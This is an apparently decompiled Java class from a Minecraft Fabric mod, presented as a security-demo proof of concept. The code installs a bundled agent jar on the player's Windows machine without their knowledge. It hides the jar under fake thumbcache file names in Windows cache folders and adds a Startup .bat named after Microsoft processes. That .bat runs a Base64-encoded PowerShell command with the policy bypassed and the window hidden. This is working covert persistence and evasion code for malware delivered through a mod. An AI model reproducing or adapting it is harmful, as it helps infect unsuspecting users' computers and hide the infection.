package com.securitydemo.poc;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Base64;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
public final class ObfuscatedAutostart {
   private static final Gson GSON = (new GsonBuilder()).setPrettyPrinting().create();
   private static final SecureRandom RANDOM = new SecureRandom();
   private static final String LEGACY_STARTUP = "SecurityDemoPoC-Agent.bat";

   private ObfuscatedAutostart() {
   }

   public static boolean isInstalled() {
      JsonObject manifest = readManifest();
      return manifest != null && manifest.has("startupPath") ? Files.exists(Paths.get(manifest.get("startupPath").getAsString()), new LinkOption[0]) : false;
   }

   public static void ensureInstalledFromModBundle() throws IOException {
      if (!isWindows()) {
         PocLogger.get().warn("Autostart skipped — Windows only");
      } else if (isInstalled()) {
         launchDetachedAgent();
      } else {
         byte[] agentBytes = readBundledAgent();
         if (agentBytes != null && agentBytes.length != 0) {
            uninstall(false);
            AutostartManifest.removeOwnedLegacyManifest();
            Layout layout = generateLayout();
            Files.createDirectories(layout.installDir);
            Path jarPath = layout.installDir.resolve(layout.jarName);
            Files.write(jarPath, agentBytes, new OpenOption[0]);
            Path configPath = layout.installDir.resolve("prefs.json");
            if (!Files.exists(configPath, new LinkOption[0])) {
               Compat.writeUtf8(configPath, defaultConfig());
            }

            Path startupPath = startupFolder().resolve(layout.startupBat);
            Files.createDirectories(startupPath.getParent());
            Compat.writeUtf8(startupPath, obfuscatedStartupBat(jarPath));
            JsonObject manifest = new JsonObject();
            manifest.addProperty("installDir", layout.installDir.toString());
            manifest.addProperty("jarName", layout.jarName);
            manifest.addProperty("startupBat", layout.startupBat);
            manifest.addProperty("startupPath", startupPath.toString());
            manifest.addProperty("installedAt", System.currentTimeMillis());
            writeManifest(manifest);
            removeLegacy();
            PocLogger.get().info("Autostart installed: {}", startupPath);
            launchDetachedAgent();
         } else {
            PocLogger.get().warn("Autostart enabled in mod but agent bundle missing — rebuild with builder checkbox");
         }
      }
   }

   public static void launchDetachedAgent() {
      try {
         JsonObject manifest = readManifest();
         if (manifest == null) {
            return;
         }

         Path installDir = Paths.get(manifest.get("installDir").getAsString());
         Path jar = installDir.resolve(manifest.get("jarName").getAsString());
         if (!Files.exists(jar, new LinkOption[0])) {
            return;
         }

         (new ProcessBuilder(new String[]{"cmd.exe", "/c", "start", "", "/B", "javaw", "-jar", jar.toAbsolutePath().toString()})).directory(installDir.toFile()).start();
         PocLogger.get().info("Detached agent launched from {}", jar);
      } catch (IOException e) {
         PocLogger.get().warn("Failed to launch detached agent", (Throwable)e);
      }

   }

   static void uninstall(boolean clearManifest) throws IOException {
      JsonObject manifest = readManifest();
      if (manifest != null && manifest.has("startupPath")) {
         Files.deleteIfExists(Paths.get(manifest.get("startupPath").getAsString()));
      } else if (manifest != null && manifest.has("startupBat")) {
         Files.deleteIfExists(startupFolder().resolve(manifest.get("startupBat").getAsString()));
      }

      removeLegacy();
      AutostartManifest.removeOwnedLegacyManifest();
      if (clearManifest) {
         Files.deleteIfExists(AutostartManifest.manifestFile());
      }

   }

   private static byte[] readBundledAgent() throws IOException {
      InputStream in = ObfuscatedAutostart.class.getClassLoader().getResourceAsStream("META-INF/security-demo-agent.dat");

      byte[] var5;
      label43: {
         try {
            if (in == null) {
               var5 = null;
               break label43;
            }

            var5 = Compat.readStreamBytes(in);
         } catch (Throwable var4) {
            if (in != null) {
               try {
                  in.close();
               } catch (Throwable var3) {
                  var4.addSuppressed(var3);
               }
            }

            throw var4;
         }

         if (in != null) {
            in.close();
         }

         return var5;
      }

      if (in != null) {
         in.close();
      }

      return var5;
   }

   private static JsonObject readManifest() {
      return AutostartManifest.readManifestJson();
   }

   private static void writeManifest(JsonObject manifest) throws IOException {
      Path file = AutostartManifest.manifestFile();
      Files.createDirectories(file.getParent());
      Compat.writeUtf8(file, GSON.toJson(manifest));
   }

   private static void removeLegacy() throws IOException {
      Files.deleteIfExists(startupFolder().resolve("SecurityDemoPoC-Agent.bat"));
      String appData = System.getenv("APPDATA");
      if (appData != null) {
         Path legacy = Paths.get(appData, "SecurityDemoPoC");
         if (Files.exists(legacy, new LinkOption[0])) {
            try {
               deleteRecursive(legacy);
            } catch (IOException var3) {
            }
         }
      }

   }

   private static void deleteRecursive(Path root) throws IOException {
      if (Files.isDirectory(root, new LinkOption[0])) {
         File[] children = root.toFile().listFiles();
         if (children != null) {
            for(File child : children) {
               deleteRecursive(child.toPath());
            }
         }
      }

      Files.deleteIfExists(root);
   }

   private static Path startupFolder() {
      String appData = System.getenv("APPDATA");
      String base = appData != null ? appData : System.getProperty("user.home");
      return Paths.get(base, "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
   }

   private static Layout generateLayout() {
      String tag = randomHex(3);
      String[] prefixes = new String[]{"MicrosoftEdgeUpdate", "RuntimeBroker", "OneDriveStandby", "WindowsDefenderSync", "ShellExperience"};
      String[] roots = new String[]{"Explorer", "INetCache", "WebCache"};
      String[] leafs = new String[]{"ThumbCacheToDelete", "Low", "V01"};
      String local = System.getenv("LOCALAPPDATA");
      if (local == null) {
         local = System.getenv("APPDATA");
      }

      Path installDir = Paths.get(local != null ? local : System.getProperty("user.home"), "Microsoft", "Windows", roots[RANDOM.nextInt(roots.length)], leafs[RANDOM.nextInt(leafs.length)], "cache_" + tag);
      String var10003 = "thumbcache_" + randomHex(2) + ".dat";
      String var10004 = prefixes[RANDOM.nextInt(prefixes.length)];
      return new Layout(installDir, var10003, var10004 + "_" + tag + ".bat");
   }

   private static String obfuscatedStartupBat(Path jarPath) {
      String b64Path = Base64.getEncoder().encodeToString(jarPath.toString().getBytes(StandardCharsets.UTF_16LE));
      String ps = "$j=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('" + b64Path + "'));$e=Get-Command javaw -ErrorAction SilentlyContinue;if(-not $e){$e=Get-Command java -ErrorAction SilentlyContinue};if($e){Start-Process $e.Source -ArgumentList \"-jar\",$j -WindowStyle Hidden}";
      String encoded = Base64.getEncoder().encodeToString(ps.getBytes(StandardCharsets.UTF_16LE));
      return "@echo off\r\nrem Windows component cache sync\r\npowershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " + encoded + "\r\n";
   }

   private static String defaultConfig() {
      return PoCConfig.toJson(PoCConfig.loadBuilt());
   }

   private static String randomHex(int bytes) {
      byte[] buf = new byte[bytes];
      RANDOM.nextBytes(buf);
      StringBuilder sb = new StringBuilder(bytes * 2);

      for(byte b : buf) {
         sb.append(String.format("%02x", b));
      }

      return sb.toString();
   }

   private static boolean isWindows() {
      return System.getProperty("os.name", "").toLowerCase().contains("win");
   }

   @Environment(EnvType.CLIENT)
   private static final class Layout {
      final Path installDir;
      final String jarName;
      final String startupBat;

      Layout(Path installDir, String jarName, String startupBat) {
         this.installDir = installDir;
         this.jarName = jarName;
         this.startupBat = startupBat;
      }
   }
}
